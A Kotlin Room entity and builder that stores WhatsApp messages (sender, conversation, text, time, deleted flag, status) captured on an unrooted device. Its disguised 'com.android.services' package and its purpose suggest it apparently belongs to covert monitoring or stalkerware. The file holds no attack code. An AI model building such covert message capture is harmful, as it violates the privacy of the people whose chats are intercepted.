package com.android.services.db.entities

import androidx.room.ColumnInfo
import androidx.room.Entity
import androidx.room.PrimaryKey

@Entity(tableName = "whatsapp_unrooted_table")
class WhatsAppUnrooted(
    @field:Transient @field:ColumnInfo(name = "id") @field:PrimaryKey(autoGenerate = true) val id: Int,
    @field:ColumnInfo(name = "uniqueId") var uniqueId: String,
    @field:ColumnInfo(name = "conversationId") var conversationId: String?,
    @field:ColumnInfo(name = "conversationName") var conversationName: String?,
    @field:ColumnInfo(name = "senderName") var senderName: String?,
    @field:ColumnInfo(name = "message") var message: String?,
    @field:ColumnInfo(name = "type") var type: String?,
    @field:ColumnInfo(name = "messageDatetime") var messageDatetime: String?,
    @field:ColumnInfo(name = "isDeleted") val isDeleted: Int,
    @field:ColumnInfo(name = "status") var status: Int,
) {

    class WhatsAppUnrootedBuilder {

        private var id: Int = 0
        private var uniqueId: String? = null
        private var conversationId: String? = null
        private var conversationName: String? = null
        private var senderName: String? = null
        private var message: String? = null
        private var type: String? = null
        private var messageDatetime: String? = null
        private var isDeleted = 0
        private var status = 0

        fun setId(id: Int): WhatsAppUnrootedBuilder {
            this.id = id
            return this
        }

        fun setUniqueId(uniqueId: String?): WhatsAppUnrootedBuilder {
            this.uniqueId = uniqueId
            return this
        }

        fun setConversationId(conversationId: String?): WhatsAppUnrootedBuilder {
            this.conversationId = conversationId
            return this
        }

        fun setConversationName(conversationName: String?): WhatsAppUnrootedBuilder {
            this.conversationName = conversationName
            return this
        }

        fun setSenderName(senderName: String?): WhatsAppUnrootedBuilder {
            this.senderName = senderName
            return this
        }

        fun setMessage(message: String?): WhatsAppUnrootedBuilder {
            this.message = message
            return this
        }

        fun setType(type: String?): WhatsAppUnrootedBuilder {
            this.type = type
            return this
        }

        fun setMessageDatetime(messageDatetime: String?): WhatsAppUnrootedBuilder {
            this.messageDatetime = messageDatetime
            return this
        }

        fun setIsDeleted(isDeleted: Int): WhatsAppUnrootedBuilder {
            this.isDeleted = isDeleted
            return this
        }

        fun setStatus(status: Int): WhatsAppUnrootedBuilder {
            this.status = status
            return this
        }

        fun create(): WhatsAppUnrooted {
            return WhatsAppUnrooted(id,
                uniqueId!!,
                conversationId,
                conversationName,
                senderName,
                message,
                type,
                messageDatetime,
                isDeleted,
                status)
        }
    }
}